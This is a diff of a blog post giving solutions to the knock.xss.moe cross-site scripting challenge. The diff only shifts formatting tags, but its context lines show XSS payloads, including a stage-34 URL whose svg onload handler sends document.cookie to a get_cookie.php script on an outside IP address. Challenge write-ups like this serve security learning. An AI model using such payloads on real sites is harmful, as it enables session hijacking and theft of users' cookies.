@@ -2,6 +2,8 @@
 layout : post
 title : knock.xss.moe
 ---
+
+
 All solution
 Ranking #41
 {% highlight python linenos %}
@@ -13,6 +15,7 @@ stage5:
 
 stage6:
 </xmp><script>alert('xxx')</script>
+{% endhighlight %}
 
 stage7:
 ```javascript
@@ -108,6 +111,5 @@ http://b236561a32729676d1ec2231e8726a0b5ee5bf57.knock.xss.moe/?q=%3Csvg%2fonload
 stage 34:
 http://[stage34]/?q=%3Csvg%2fonload%3Dwindow.open%28%22%2f%2f118.69.135.163%2fget_cookie.php%3F%22%2bdocument.cookie%29
 
-{% endhighlight %}
 
 Thanks @ml and @tsu for sharing!
